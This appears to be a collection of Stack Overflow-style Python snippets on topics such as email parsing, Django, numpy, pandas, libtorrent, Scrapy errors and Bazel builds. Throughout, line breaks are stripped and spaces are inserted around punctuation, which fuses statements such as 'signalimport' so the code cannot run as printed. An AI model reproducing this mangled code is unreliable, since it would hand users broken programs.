"> > > email.utils.decode_rfc2231 ( `` utf-8 '' T % C3 % A4st.txt '' ) [ 'utf-8 ' , `` , 'T % C3 % A4st.txt ' ] > > > email.utils.decode_params ( [ ... ( 1,2 ) , ... ( `` foo '' , '' bar '' ) , ... ( `` name* '' , '' utf-8 '' T % C3 % A4st.txt '' ) , ... ( `` baz*0 '' , '' two '' ) , ( `` baz*1 '' , '' -part '' ) ] ) [ ( 1 , 2 ) , ( 'foo ' , ' '' bar '' ' ) , ( 'baz ' , ' '' two-part '' ' ) , ( 'name ' , ( 'utf-8 ' , `` , ' '' TÃ¤st.txt '' ' ) ) ] > > > [ ( k , email.utils.collapse_rfc2231_value ( v ) ) for k , v in ... email.utils.decode_params ( [ ... ( 1,2 ) , ... ( `` foo '' , '' bar '' ) , ... ( `` name* '' , '' utf-8 '' T % C3 % A4st.txt '' ) , ... ( `` baz*0 '' , '' two '' ) , ( `` baz*1 '' , '' -part '' ) ] ) [ 1 : ] ] [ ( 'foo ' , 'bar ' ) , ( 'baz ' , 'two-part ' ) , ( 'name ' , ' '' Täst.txt '' ' ) ]"
"# If there are errors or if we requested a preview show the commentif form.errors or preview : template_list = [ `` comments/ % s_ % s_preview.html '' % tuple ( str ( model._meta ) .split ( `` . `` ) ) , `` comments/ % s_preview.html '' % model._meta.app_label , `` comments/preview.html '' , ] return render_to_response ( template_list , { `` comment '' : form.data.get ( `` comment '' , `` '' ) , `` form '' : form , `` next '' : next , } , RequestContext ( request , { } ) )"
"import signalimport threadingimport sys if sys.version_info > ( 3,0 ) : from socketserver import TCPServer , BaseRequestHandlerelse : from SocketServer import TCPServer , BaseRequestHandlerdef shutdown ( signum , frame ) : print ( `` Shutting down server thread '' ) server.shutdown ( ) server = TCPServer ( ( '127.0.0.1 ' , 7654 ) , BaseRequestHandler ) signal.signal ( signal.SIGTERM , shutdown ) signal.signal ( signal.SIGINT , shutdown ) server_thread = threading.Thread ( target=server.serve_forever ) print ( `` Starting server thread '' ) server_thread.start ( ) print ( `` Waiting for server thread to shut down '' ) server_thread.join ( ) print ( `` Server thread terminated '' ) Starting server threadWaiting for server thread to shut down^CShutting down server threadServer thread terminated Starting server threadWaiting for server thread to shut down^CKilled"
"@ bp.route ( '/submit ' , methods= [ 'GET ' , 'POST ' ] ) def submit ( ) : form = SubmissionForm ( ) labels = current_app.config [ 'TRELLO_LABELS ' ] if form.validate_on_submit ( ) : submission = Submission ( ) .create ( title=form.data [ 'title ' ] , email=form.data [ 'email ' ] , card_id=card.id , card_url=card.url ) # reset form by redirecting back and setting the URL params return redirect ( url_for ( 'bp.submit ' , success=1 , id=card.id ) ) return render_template ( 'submit.html ' , form=form ) import pytest @ pytest.mark.usefixtures ( 'session ' ) class TestRoutes : def test_submit_post ( self , app , mocker ) : with app.test_request_context ( '/submit ' , method='post ' , query_string=dict ( email='email @ example.com ' , title='foo ' , pitch='foo ' , format='IN-DEPTH ' , audience='INTERMEDIATE ' , description='foo ' , notes='foo ' ) ) : assert resp.status_code == 200"
"> > > nan = np.nan > > > [ 1,2,3 ] == [ 3 ] False > > > [ 1,2,3 ] == [ 1,2,3 ] True > > > [ 1,2 , nan ] == [ 1,2 , nan ] True *** > > > nan == nanFalse > > > [ nan ] == [ nan ] True *** > > > [ nan , nan ] == [ nan for i in range ( 2 ) ] True *** > > > [ nan , nan ] == [ float ( nan ) for i in range ( 2 ) ] True *** > > > float ( nan ) is ( float ( nan ) + 1 ) False > > > float ( nan ) is float ( nan ) True ***"
"def downloadTorrent ( torrent ) : `` '' '' Download torrent using libtorrent library . Torrent will be stored at the current directory. `` '' '' ses = lt.session ( ) ses.listen_on ( 6881 , 6891 ) info = lt.torrent_info ( torrent ) h = ses.add_torrent ( { 'ti ' : info , 'save_path ' : './ ' } ) ses.start_dht ( ) print 'starting ' , h.name ( ) while ( not h.is_seed ( ) ) : s = h.status ( ) state_str = [ 'queued ' , 'checking ' , 'downloading metadata ' , \ 'downloading ' , 'finished ' , 'seeding ' , 'allocating ' , 'checking fastresume ' ] print '\r % .2f % % complete ( down : % .1f kb/s up : % .1f kB/s peers : % d ) % s ' % \ ( s.progress * 100 , s.download_rate / 1000 , s.upload_rate / 1000 , \ s.num_peers , state_str [ s.state ] ) , sys.stdout.flush ( ) time.sleep ( 1 ) print h.name ( ) , 'complete ' 0.00 % complete ( down : 0.0 kb/s up : 0.0 kB/s peers : 0 ) downloading"
"> > > timeit.timeit ( 'from win32com.client import Dispatch ' , number=100000 ) 0.18883283882571789 > > > timeit.timeit ( 'import win32com.client ' , number=100000 ) 0.1275979248277963"
"x = np.array ( [ [ 2 , 5 ] , [ 3 , 4 ] , [ 1 , 3 ] , [ 2 , 5 ] , [ 4 , 5 ] , [ 1 , 3 ] , [ 1 , 4 ] , [ 3 , 4 ] ] ) array ( [ [ 4 , 5 ] , [ 1 , 4 ] ] )"
"# requirements.txtboto3==1.9.138botocore==1.12.138docutils==0.14jmespath==0.9.4python-dateutil==2.8.0s3transfer==0.2.0six==1.12.0urllib3==1.24.2 ... from boto3_layer as boto3 ... log.info ( boto3 ) import boto3def lambda_handler ( event , context ) : textract = boto3.client ( 'textract ' )"
"import numpy as npfrom mpl_toolkits.mplot3d import Axes3Dimport matplotlib.pyplot as plt # Radius of the spherer = 0.1648 # Our theta valstheta = np.array ( [ 0.503352956 , 1.006705913 , 1.510058869 , 1.631533785 , 2.134886741 , 2.638239697 ] ) # Our phi valuesphi = np.array ( [ np.pi/4 , np.pi/2 , 3*np.pi/4 , np.pi , 5*np.pi/4 , 3*np.pi/2 , 7*np.pi/4 , 2*np.pi ] ) # Loops over each angle to generate the points on the surface of spheredef gen_coord ( ) : x = np.zeros ( ( len ( theta ) , len ( phi ) ) , dtype=np.float32 ) y = np.zeros ( ( len ( theta ) , len ( phi ) ) , dtype=np.float32 ) z = np.zeros ( ( len ( theta ) , len ( phi ) ) , dtype=np.float32 ) # runs over each angle , creating the x y z values for i in range ( len ( theta ) ) : for j in range ( len ( phi ) ) : x [ i , j ] = r * np.sin ( theta [ i ] ) * np.cos ( phi [ j ] ) y [ i , j ] = r * np.sin ( theta [ i ] ) * np.sin ( phi [ j ] ) z [ i , j ] = r * np.cos ( theta [ i ] ) x_vals = np.reshape ( x , 48 ) y_vals = np.reshape ( y , 48 ) z_vals = np.reshape ( z , 48 ) return x_vals , y_vals , z_vals # Plots the points on a 3d graphdef plot ( ) : fig = plt.figure ( ) ax = fig.gca ( projection='3d ' ) x , y , z = gen_coord ( ) ax.scatter ( x , y , z ) plt.show ( ) from scipy.interpolate import RectSphereBivariateSplineimport numpy as npfrom mpl_toolkits.mplot3d import Axes3Dimport matplotlib.pyplot as pltfrom matplotlib.colorbar import ColorbarBase , make_axes_gridspecr = 0.1648 theta = np.array ( [ 0.503352956 , 1.006705913 , 1.510058869 , 1.631533785 , 2.134886741 , 2.638239697 ] ) # Our theta valsphi = np.array ( [ np.pi/4 , np.pi/2 , 3*np.pi/4 , np.pi , 5*np.pi/4 , 3*np.pi/2 , 7*np.pi/4 , 2*np.pi ] ) # Our phi valuesv = np.array ( [ 0.002284444388889,0.003155555477778,0.002968888844444,0.002035555555556,0.001884444411111,0.002177777733333,0.001279999988889,0.002666666577778,0.015777777366667,0.006053333155556,0.002755555533333,0.001431111088889,0.002231111077778,0.001893333311111,0.001288888877778,0.005404444355556,0,0.005546666566667,0.002231111077778,0.0032533332,0.003404444355556,0.000888888866667,0.001653333311111,0.006435555455556,0.015311110644444,0.002453333311111,0.000773333333333,0.003164444366667,0.035111109822222,0.005164444355556,0.003671111011111,0.002337777755556,0.004204444288889,0.001706666666667,0.001297777755556,0.0026577777,0.0032444444,0.001697777733333,0.001244444411111,0.001511111088889,0.001457777766667,0.002159999944444,0.000844444433333,0.000595555555556,0,0,0,0 ] ) # Lists 1A-H , 2A-H , ... ,6A-Hvolt = np.reshape ( v , ( 6 , 8 ) ) spl = RectSphereBivariateSpline ( theta , phi , volt ) # evaluate spline fit on a denser 50 x 50 grid of thetas and phistheta_itp = np.linspace ( 0 , np.pi , 100 ) phi_itp = np.linspace ( 0 , 2 * np.pi , 100 ) d_itp = spl ( theta_itp , phi_itp ) x_itp = r * np.outer ( np.sin ( theta_itp ) , np.cos ( phi_itp ) ) # Cartesian coordinates of spherey_itp = r * np.outer ( np.sin ( theta_itp ) , np.sin ( phi_itp ) ) z_itp = r * np.outer ( np.cos ( theta_itp ) , np.ones_like ( phi_itp ) ) norm = plt.Normalize ( ) facecolors = plt.cm.jet ( norm ( d_itp ) ) # surface plotfig , ax = plt.subplots ( 1 , 1 , subplot_kw= { 'projection ' : '3d ' , 'aspect ' : 'equal ' } ) ax.hold ( True ) ax.plot_surface ( x_itp , y_itp , z_itp , rstride=1 , cstride=1 , facecolors=facecolors ) # Colourbarcax , kw = make_axes_gridspec ( ax , shrink=0.6 , aspect=15 ) cb = ColorbarBase ( cax , cmap=plt.cm.jet , norm=norm ) cb.set_label ( 'Voltage ' , fontsize= ' x-large ' ) plt.show ( )"
"import itertoolsdef radix_sort ( unsorted ) : `` Fast implementation of radix sort for any size num . '' maximum , minimum = max ( unsorted ) , min ( unsorted ) max_bits = maximum.bit_length ( ) highest_byte = max_bits // 8 if max_bits % 8 == 0 else ( max_bits // 8 ) + 1 min_bits = minimum.bit_length ( ) lowest_byte = min_bits // 8 if min_bits % 8 == 0 else ( min_bits // 8 ) + 1 sorted_list = unsorted for offset in xrange ( lowest_byte , highest_byte ) : sorted_list = radix_sort_offset ( sorted_list , offset ) return sorted_listdef radix_sort_offset ( unsorted , offset ) : `` Helper function for radix sort , sorts each offset . '' byte_check = ( 0xFF < < offset*8 ) buckets = [ [ ] for _ in xrange ( 256 ) ] for num in unsorted : byte_at_offset = ( num & byte_check ) > > offset*8 buckets [ byte_at_offset ] .append ( num ) return list ( itertools.chain.from_iterable ( buckets ) ) for num in unsorted : byte_at_offset = ( num & byte_check ) > > offset*8 buckets [ byte_at_offset ] .append ( num )"
"R_CONFLICT= { A : [ B , C , D ] } R_DEPENDS = { X : [ [ Y , Z ] , W , .. } # means : A depends on either Y or Z , and WR_MIN = { BAR : n , BAZ : m } R_MAX = { BAR : o , BAZ : p } # now just loop over lists to check them.."
"# this is managed by another threaddef processor_runner ( ) : generator = SerialMessageGenerator ( ) for message in generator : for client in Processor.connections : client.put ( message ) # this is managed by twisted 's wsgi implementationdef main ( environ , start_response ) : queue = Queue ( ) Processor.connections.append ( queue ) status = '200 OK ' response_headers = [ ( 'Content-Type ' , 'application/json ' ) , ( 'Transfer-Encoding ' , 'chunked ' ) ] start_response ( status , response_headers ) return iter ( queue.get , None ) class IterableQueue ( Queue ) : def __init__ ( self ) : Queue.__init__ ( self ) # Queue is an old style class ShellProcessor.connections.append ( self ) def __iter__ ( self ) : return iter ( self.get , None ) def close ( self ) : self.put ( None ) self.task_done ( ) ShellProcessor.connections.remove ( self )"
"> > > from django.contrib.gis.measure import D > > > from app.models import Place > > > from django.contrib.gis.geos import Point > > > qs = Place.objects.all ( ) > > > point = Point ( -118 , 34 ) > > > qs.filter ( coordinates__distance_lte= ( point , D ( m=1 ) ) ) [ < Place : 7-Eleven > , < Place : Arthur Murray Dance Studio > , < Place : Costco > , < Place : AMC Century City 15 > , < Place : 24 Hour Fitness > , < Place : Ralphs > , < Place : Houston 's Restaurant > , < Place : CVS/pharmacy > , < Place : Shaky Alibi > , < Place : Sephora > , < Place : Trader Joe 's > ] > > > qs = Place.objects.all ( ) .transform ( 3786 ) > > > point = Point ( -118 , 34 , srid=3786 ) > > > qs.filter ( coordinates__distance_lte= ( point , D ( m=1 ) ) ) [ < Place : 7-Eleven > , < Place : Arthur Murray Dance Studio > , < Place : Costco > , < Place : AMC Century City 15 > , < Place : 24 Hour Fitness > , < Place : Ralphs > , < Place : Houston 's Restaurant > , < Place : CVS/pharmacy > , < Place : Shaky Alibi > , < Place : Sephora > , < Place : Trader Joe 's > ]"
"from sklearn.naive_bayes import MultinomialNBfrom sklearn.feature_extraction.text import HashingVectorizerfrom sklearn.preprocessing import MultiLabelBinarizerfrom sklearn.multiclass import OneVsRestClassifiercategories = [ ' a ' , ' b ' , ' c ' ] X = [ `` This is a test '' , `` This is another attempt '' , `` And this is a test too ! `` ] Y = [ [ ' a ' , ' b ' ] , [ ' b ' ] , [ ' a ' , ' b ' ] ] mlb = MultiLabelBinarizer ( classes=categories ) vectorizer = HashingVectorizer ( decode_error='ignore ' , n_features=2 ** 18 , non_negative=True ) clf = OneVsRestClassifier ( MultinomialNB ( alpha=0.01 ) ) X_train = vectorizer.fit_transform ( X ) Y_train = mlb.fit_transform ( Y ) clf.partial_fit ( X_train , Y_train , classes=categories )"
from juno import * @ route ( '/ ' ) def index ( web ) : return 'Juno says hi'run ( )
< form action= '' /add '' method= '' post '' > < div > < textarea name= '' Name '' rows= '' 1 '' cols= '' 60 '' > name < /textarea > < /div > < div > < textarea name= '' Email '' rows= '' 1 '' cols= '' 60 '' > email < /textarea > < /div > < div > < textarea name= '' Comments '' rows= '' 6 '' cols= '' 60 '' > comments < /textarea > < /div > < div > < input type= '' submit '' value= '' Post '' > < /div > < /form >
"class Vehicule ( object ) : def _getSpatials ( self ) : pass def _setSpatials ( self , newSpatials ) : pass spatials = property ( _getSpatials , _setSpatials ) class Car ( Vehicule ) def _getSpatials ( self ) : spatials = super ( Car , self ) .spatials ( ) return spatials"
"import numpy as npimport pandas as pdinit_time=pd.date_range ( start='2010-01-01 00:00 ' , end='2010-01-05 00:00 ' , freq='12H ' ) valid_time=pd.date_range ( start='2010-01-01 00:00 ' , end='2010-01-05 00:00 ' , freq='12H ' ) data = np.random.random ( len ( valid_time ) ) frame = pd.DataFrame ( index=valid_time , data=data ) frame [ 'init_time ' ] = init_time 0 init_time2010-01-01 00:00:00 0.869667 2010-01-01 00:00:002010-01-01 12:00:00 0.225805 2010-01-01 12:00:002010-01-02 00:00:00 0.348080 2010-01-02 00:00:002010-01-02 12:00:00 0.761399 2010-01-02 12:00:002010-01-03 00:00:00 0.645069 2010-01-03 00:00:002010-01-03 12:00:00 0.133111 2010-01-03 12:00:002010-01-04 00:00:00 0.314302 2010-01-04 00:00:002010-01-04 12:00:00 0.130491 2010-01-04 12:00:002010-01-05 00:00:00 0.621703 2010-01-05 00:00:00 daily = frame.resample ( 'D ' , how='mean ' ) 02010-01-01 0.5477362010-01-02 0.5547402010-01-03 0.3890902010-01-04 0.2223962010-01-05 0.621703"
"import matplotlib.pylab as pltplt.hist ( some_data ) plt.axvline ( 0.5 , color= ' k ' , linestyle= ' -- ' ) plt.text ( 0.5 , 0.5 , 'Some Text ' , ha='center ' , va='center ' , rotation='vertical ' ) plt.show ( )"
"df = pd.DataFrame ( { 'column_a ' : [ 'a_1 ' , 'a_2 ' ] , 'column_b ' : [ 'b_1 ' , 'b_2 ' ] , 'column_x ' : [ [ 'c_1 ' , 'c_2 ' ] , [ 'd_1 ' , 'd_2 ' ] ] } ) column_a column_b column_x0 a_1 b_1 [ c_1 , c_2 ] 1 a_2 b_2 [ d_1 , d_2 ] column_a column_b column_x0 a_1 b_1 c_11 a_1 b_1 c_22 a_2 b_2 d_13 a_2 b_2 d_2 lens = [ len ( item ) for item in df [ 'column_x ' ] ] pd.DataFrame ( { `` column_a '' : np.repeat ( df [ 'column_a ' ] .values , lens ) , `` column_b '' : np.repeat ( df [ 'column_b ' ] .values , lens ) , `` column_x '' : np.concatenate ( df [ 'column_x ' ] .values ) } )"
"Group 1 : ( 1,23 ) , ( 2,23 ) , ( 3,23 ) ... Group 2 : ( 68,200 ) , ( 68,201 ) , ( 68,203 ) , ( 68,204 ) , ( 68,100 ) , ( 68,101 ) , ( 68,101 ) ... 1,231,232,233,234,235,236,237,238,239,2310,2311,2312,2313,2314,2315,2316,2310,3311,3312,3313,3314,3315,3316,3317,3318,3319,332,282,283,2834,7534,7634,7634,7734,7834,7934,8034,8134,8234,8334,7534,7634,7634,7734,7834,7934,8034,81400,28400,28400,2868,20068,20168,20368,20468,10068,10168,10368,104"
curl -X POST -d `` client_id=YOUR_CLIENT_ID & client_secret=YOUR_CLIENT_SECRET & grant_type=password & username=YOUR_USERNAME & password=YOUR_PASSWORD '' http : //localhost:8000/oauth2/access_token/
"import reimport scrapyfrom vesseltracker.items import VesseltrackerItemclass GetVessel ( scrapy.Spider ) : name = `` getvessel '' allowed_domains = [ `` marinetraffic.com '' ] start_urls = [ 'http : //www.marinetraffic.com/en/ais/index/ports/all/flag : AE ' , ] def parse ( self , response ) : item = VesseltrackerItem ( ) for ports in response.xpath ( '//table/tr [ position ( ) > 1 ] ' ) : item [ 'port_name ' ] = ports.xpath ( 'td [ 2 ] /a/text ( ) ' ) .extract ( ) port_homepage_url = ports.xpath ( 'td [ 7 ] /a/ @ href ' ) .extract ( ) port_homepage_url = response.urljoin ( port_homepage_url ) yield scrapy.Request ( port_homepage_url , callback=self.parse , meta= { 'item ' : item } ) 2016-09-30 17:17:13 [ scrapy ] DEBUG : Crawled ( 200 ) < GET http : //www.marinetraffic.com/robots.txt > ( referer : None ) 2016-09-30 17:17:14 [ scrapy ] DEBUG : Crawled ( 200 ) < GET http : //www.marinetraffic.com/en/ais/index/ports/all/flag : AE > ( referer : None ) 2016-09-30 17:17:14 [ scrapy ] ERROR : Spider error processing < GET http : //www.marinetraffic.com/en/ais/index/ports/all/flag : AE > ( referer : None ) Traceback ( most recent call last ) : File `` /Users/noussh/python/env/lib/python2.7/site-packages/scrapy/utils/defer.py '' , line 102 , in iter_errback yield next ( it ) File `` /Users/noussh/python/env/lib/python2.7/site-packages/scrapy/spidermiddlewares/offsite.py '' , line 29 , in process_spider_output for x in result : File `` /Users/noussh/python/env/lib/python2.7/site-packages/scrapy/spidermiddlewares/referer.py '' , line 22 , in < genexpr > return ( _set_referer ( r ) for r in result or ( ) ) File `` /Users/noussh/python/env/lib/python2.7/site-packages/scrapy/spidermiddlewares/urllength.py '' , line 37 , in < genexpr > return ( r for r in result or ( ) if _filter ( r ) ) File `` /Users/noussh/python/env/lib/python2.7/site-packages/scrapy/spidermiddlewares/depth.py '' , line 58 , in < genexpr > return ( r for r in result or ( ) if _filter ( r ) ) File `` /Users/noussh/python/vesseltracker/vesseltracker/spiders/marinetraffic.py '' , line 19 , in parse port_homepage_url = response.urljoin ( port_homepage_url ) File `` /Users/noussh/python/env/lib/python2.7/site-packages/scrapy/http/response/text.py '' , line 78 , in urljoin return urljoin ( get_base_url ( self ) , url ) File `` /usr/local/Cellar/python/2.7.12/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urlparse.py '' , line 261 , in urljoin urlparse ( url , bscheme , allow_fragments ) File `` /usr/local/Cellar/python/2.7.12/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urlparse.py '' , line 143 , in urlparse tuple = urlsplit ( url , scheme , allow_fragments ) File `` /usr/local/Cellar/python/2.7.12/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urlparse.py '' , line 176 , in urlsplit cached = _parse_cache.get ( key , None ) TypeError : unhashable type : 'list '"
"e = net.train ( input_part1 , output_part1 , show=1 , epochs=100 , goal=0.0001 ) e = net.train ( input_part2 , output_part2 , show=1 , epochs=100 , goal=0.0001 ) e = net.train ( input_part3 , output_part3 , show=1 , epochs=100 , goal=0.0001 )"
"bazel build //tensorflow_serving/ ... py_binary ( name = `` export_cnn '' , srcs = [ `` export_cnn.py '' , ] , deps = [ `` @ tf//tensorflow : tensorflow_py '' , `` @ tf_serving//tensorflow_serving/session_bundle : exporter '' , ] , ) bazel build //my_project : export_cnn ERROR : ... /bazel/_bazel_me/3ef3308a843af155635e839105e8da5c/external/tf/tensorflow/core/BUILD:92:1 : null failed : protoc failed : error executing command bazel-out/host/bin/external/tf/google/protobuf/protoc ' -- cpp_out=bazel-out/local_linux-fastbuild/genfiles/external/tf ' -Iexternal/tf -Iexternal/tf/google/protobuf/src ... ( remaining 1 argument ( s ) skipped ) .tensorflow/core/framework/step_stats.proto : File not found.tensorflow/core/framework/device_attributes.proto : File not found.tensorflow/core/framework/graph.proto : File not found.tensorflow/core/framework/tensor.proto : File not found.tensorflow/core/protobuf/config.proto : File not found.tensorflow/core/protobuf/worker.proto : Import `` tensorflow/core/framework/step_stats.proto '' was not found or had errors.tensorflow/core/protobuf/worker.proto : Import `` tensorflow/core/framework/device_attributes.proto '' was not found or had errors.tensorflow/core/protobuf/worker.proto : Import `` tensorflow/core/framework/graph.proto '' was not found or had errors.tensorflow/core/protobuf/worker.proto : Import `` tensorflow/core/framework/tensor.proto '' was not found or had errors.tensorflow/core/protobuf/worker.proto : Import `` tensorflow/core/protobuf/config.proto '' was not found or had errors.tensorflow/core/protobuf/worker.proto:41:12 : `` DeviceAttributes '' is not defined.tensorflow/core/protobuf/worker.proto:64:3 : `` GraphDef '' is not defined.tensorflow/core/protobuf/worker.proto:72:3 : `` GraphOptions '' is not defined.tensorflow/core/protobuf/worker.proto:141:3 : `` TensorProto '' is not defined.tensorflow/core/protobuf/worker.proto:180:3 : `` StepStats '' is not defined.tensorflow/core/protobuf/worker.proto:225:3 : `` BusAdjacency '' is not defined.tensorflow/core/protobuf/worker.proto:227:3 : `` BusAdjacency '' is not defined.tensorflow/core/protobuf/worker.proto:232:3 : `` TensorProto '' is not defined.tensorflow/core/protobuf/worker.proto:272:3 : `` StepStats '' is not defined . local_repository ( name = `` tf '' , path = __workspace_dir__ + `` /serving/tensorflow '' , ) local_repository ( name = `` tf_serving '' , path = __workspace_dir__ + `` /serving '' , ) load ( '//serving/tensorflow/tensorflow : workspace.bzl ' , 'tf_workspace ' ) tf_workspace ( `` serving/tensorflow/ '' , `` @ tf '' )"
"url = 'https : //github.abc.defcom/api/v3/repos/abc/def/releases/401/assets ? name=foo.sh ' r = requests.post ( url , headers= { 'Content-Type ' : 'application/binary ' } , data=open ( 'sometext.txt ' , ' r ' ) , auth= ( 'user ' , 'password ' ) ) > > > r.textu ' { `` message '' : '' Not Found '' , '' documentation_url '' : '' https : //developer.github.com/enterprise/2.4/v3 '' } '"
< table > < tbody > < tr > < td > a column < /td > < td > a value < /td > < /tr > < /tbody > < /table >
"with self.context_manager_one ( some , parameters , that , are , passed ) \ as return_value_one , \ self.context_manager_two ( self.p , slice ( None ) , None ) \ as return_value_two :"
"// t : current time , b : begInnIng value , c : change In value , d : durationdef : 'easeOutQuad ' , swing : function ( x , t , b , c , d ) { //alert ( jQuery.easing.default ) ; return jQuery.easing [ jQuery.easing.def ] ( x , t , b , c , d ) ; } , easeInQuad : function ( x , t , b , c , d ) { return c* ( t/=d ) *t + b ; } , easeOutQuad : function ( x , t , b , c , d ) { return -c * ( t/=d ) * ( t-2 ) + b ; } ,"
"/usr/local/lib/python2.7/dist-packages/sklearn/linear_model/omp.py:391 : RuntimeWarning : Orthogonal matching pursuit ended prematurely due to lineardependence in the dictionary . The requested precision might not have been met . copy_X=copy_X , return_path=return_path )"
"x = [ range ( i , i+10 ) for i in xrange ( 1,100,10 ) ] > > > x [ 2 ] [ : ] [ 21 , 22 , 23 , 24 , 25 , 26 , 27 , 28 , 29 , 30 ] > > > x [ : ] [ 2 ] [ 21 , 22 , 23 , 24 , 25 , 26 , 27 , 28 , 29 , 30 ]"
"words = [ 'Apple ' , 'Ape ' , 'Bark ' , 'Barn ' ] { ' A ' : { ' P ' : { ' E ' : { } , ' P ' : { ' L ' : { ' E ' : { } } } } } , ' B ' : { ' A ' : { ' R ' : { ' K ' : { } , ' N ' : { } } } } }"
"# ! /usr/bin/env python # this file will run as client or daemon and fetch torrent meta data i.e . torrent files from magnet uriimport libtorrent as lt # libtorrent libraryimport tempfile # for settings parameters while fetching metadata as temp dirimport sys # getting arguiments from shell or exit scriptfrom time import sleep # sleepimport shutil # removing directory tree from temp directory import os.path # for getting pwd and other thingsfrom pprint import pprint # for debugging , showing object dataimport MySQLdb # DB connectivity import osfrom datetime import date , timedeltasession = lt.session ( lt.fingerprint ( `` UT '' , 3 , 4 , 5 , 0 ) , flags=0 ) session.listen_on ( 6881 , 6891 ) session.add_extension ( 'ut_metadata ' ) session.add_extension ( 'ut_pex ' ) session.add_extension ( 'smart_ban ' ) session.add_extension ( 'metadata_transfer ' ) session_save_filename = `` /magnet2torrent/magnet_to_torrent_daemon.save_state '' if ( os.path.isfile ( session_save_filename ) ) : fileread = open ( session_save_filename , 'rb ' ) session.load_state ( lt.bdecode ( fileread.read ( ) ) ) fileread.close ( ) print ( 'session loaded from file ' ) else : print ( 'new session started ' ) session.add_dht_router ( `` router.utorrent.com '' , 6881 ) session.add_dht_router ( `` router.bittorrent.com '' , 6881 ) session.add_dht_router ( `` dht.transmissionbt.com '' , 6881 ) session.add_dht_router ( `` dht.aelitis.com '' , 6881 ) session.start_dht ( ) session.start_lsd ( ) session.start_upnp ( ) session.start_natpmp ( ) alive = Truewhile alive : db_conn = MySQLdb.connect ( host = `` , user = `` , passwd = `` , db = `` , unix_socket='/mysql/mysql.sock ' ) # Open database connection # print ( 'reconnecting ' ) # get all records where enabled = 0 and uploaded within yesterday subset_count = 100 ; yesterday = date.today ( ) - timedelta ( 1 ) yesterday = yesterday.strftime ( ' % Y- % m- % d % H : % M : % S ' ) # print ( yesterday ) total_count_query = ( `` SELECT COUNT ( * ) as total_count FROM content WHERE upload_date > ' '' + yesterday + '' ' AND enabled = ' 0 ' `` ) # print ( total_count_query ) try : total_count_cursor = db_conn.cursor ( ) # prepare a cursor object using cursor ( ) method total_count_cursor.execute ( total_count_query ) # Execute the SQL command total_count_results = total_count_cursor.fetchone ( ) # Fetch all the rows in a list of lists . total_count = total_count_results [ 0 ] print ( total_count ) except : print `` Error : unable to select data '' total_pages = total_count/subset_count # print ( total_pages ) current_page = 1 while ( current_page < = total_pages ) : from_count = ( current_page * subset_count ) - subset_count # print ( current_page ) # print ( from_count ) hashes = [ ] get_mysql_data_query = ( `` SELECT hash FROM content WHERE upload_date > ' '' + yesterday + '' ' AND enabled = ' 0 ' ORDER BY record_num DESC LIMIT `` + str ( from_count ) + '' , `` + str ( subset_count ) + '' `` ) # print ( get_mysql_data_query ) try : get_mysql_data_cursor = db_conn.cursor ( ) # prepare a cursor object using cursor ( ) method get_mysql_data_cursor.execute ( get_mysql_data_query ) # Execute the SQL command get_mysql_data_results = get_mysql_data_cursor.fetchall ( ) # Fetch all the rows in a list of lists . for row in get_mysql_data_results : hashes.append ( row [ 0 ] .upper ( ) ) except : print `` Error : unable to select data '' # print ( hashes ) handles = [ ] for hash in hashes : tempdir = tempfile.mkdtemp ( ) add_magnet_uri_params = { 'save_path ' : tempdir , 'duplicate_is_error ' : True , 'storage_mode ' : lt.storage_mode_t ( 2 ) , 'paused ' : False , 'auto_managed ' : True , 'duplicate_is_error ' : True } magnet_uri = `` magnet : ? xt=urn : btih : '' + hash.upper ( ) + `` & tr=udp % 3A % 2F % 2Ftracker.openbittorrent.com % 3A80 & tr=udp % 3A % 2F % 2Ftracker.publicbt.com % 3A80 & tr=udp % 3A % 2F % 2Ftracker.ccc.de % 3A80 '' # print ( magnet_uri ) handle = lt.add_magnet_uri ( session , magnet_uri , add_magnet_uri_params ) handles.append ( handle ) # push handle in handles list # print ( `` handles length is : '' ) # print ( len ( handles ) ) while ( len ( handles ) ! = 0 ) : for h in handles : # print ( `` inside handles for each loop '' ) if h.has_metadata ( ) : torinfo = h.get_torrent_info ( ) final_info_hash = str ( torinfo.info_hash ( ) ) final_info_hash = final_info_hash.upper ( ) torfile = lt.create_torrent ( torinfo ) torcontent = lt.bencode ( torfile.generate ( ) ) tfile_size = len ( torcontent ) try : insert_cursor = db_conn.cursor ( ) # prepare a cursor object using cursor ( ) method insert_cursor.execute ( `` '' '' INSERT INTO dht_tfiles ( hash , tdata ) VALUES ( % s , % s ) '' '' '' , [ final_info_hash , torcontent ] ) db_conn.commit ( ) # print `` data inserted in DB '' except MySQLdb.Error , e : try : print `` MySQL Error [ % d ] : % s '' % ( e.args [ 0 ] , e.args [ 1 ] ) except IndexError : print `` MySQL Error : % s '' % str ( e ) shutil.rmtree ( h.save_path ( ) ) # remove temp data directory session.remove_torrent ( h ) # remove torrnt handle from session handles.remove ( h ) # remove handle from list else : if ( h.status ( ) .active_time > 600 ) : # check if handle is more than 10 minutes old i.e . 600 seconds # print ( 'remove_torrent ' ) shutil.rmtree ( h.save_path ( ) ) # remove temp data directory session.remove_torrent ( h ) # remove torrnt handle from session handles.remove ( h ) # remove handle from list sleep ( 1 ) # print ( 'sleep1 ' ) # print ( 'sleep10 ' ) # sleep ( 10 ) current_page = current_page + 1 # save session state filewrite = open ( session_save_filename , `` wb '' ) filewrite.write ( lt.bencode ( session.save_state ( ) ) ) filewrite.close ( ) print ( 'sleep60 ' ) sleep ( 60 ) # save session state filewrite = open ( session_save_filename , `` wb '' ) filewrite.write ( lt.bencode ( session.save_state ( ) ) ) filewrite.close ( )"
"urlpatterns = [ path ( 'test/ < test_arg > / ' , views.test , name='test ' ) , ] Using the URLconf defined in test.urls , Django tried these URL patterns , in this order : reader/ test/ < test_arg > / admin/The current path , test/test1/test2/ , did n't match any of these ."
"from random import randompoints = [ ( random ( ) , random ( ) ) for _ in xrange ( 1000 ) ] from ctypes import c_floatdef array_ctypes ( points ) : n = len ( points ) return n , ( c_float* ( 2*n ) ) ( * [ u for point in points for u in point ] ) from struct import packdef array_struct ( points ) : n = len ( points ) return n , pack ( `` f '' *2*n , * [ u for point in points for u in point ] )"
